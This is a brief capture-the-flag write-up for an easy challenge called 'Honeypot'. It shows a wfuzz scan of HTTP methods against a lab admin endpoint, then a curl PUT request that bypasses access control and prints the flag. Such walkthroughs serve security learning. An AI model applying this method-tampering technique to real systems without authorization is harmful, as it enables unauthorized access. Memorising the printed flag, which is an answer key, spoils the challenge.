### Honeypot
Level: Easy

Access the admin page to get the flag, but don't get into honeypot and dig too deep =)

### Solution

```
wfuzz  -u "http://62.173.140.174:36004/admin" --hh 137 -z list,GET-HEAD-POST-TRACE-OPTIONS-PUT -X FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://62.173.140.174:36004/admin
Total requests: 6

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000005:   200        0 L      0 W        0 Ch        "OPTIONS - OPTIONS"                                                                                                                                                         
000000003:   200        0 L      7 W        52 Ch       "POST - POST"                                                                                                                                                               
000000006:   200        0 L      10 W       90 Ch       "PUT - PUT"                                                                                                                                                                 
000000002:   500        0 L      0 W        0 Ch        "HEAD - HEAD"                                                                                                                                                               
000000004:   405        5 L      20 W       153 Ch      "TRACE - TRACE"                                                                                                                                                             

Total time: 0
Processed Requests: 6
Filtered Requests: 1
Requests/sec.: 0
```

```
curl -X PUT http://62.173.140.174:36004/admin  
Welcome to the admin page. Take your flag - CODEBY{put_http_m3th0d_f0r_p4ss}!% 
```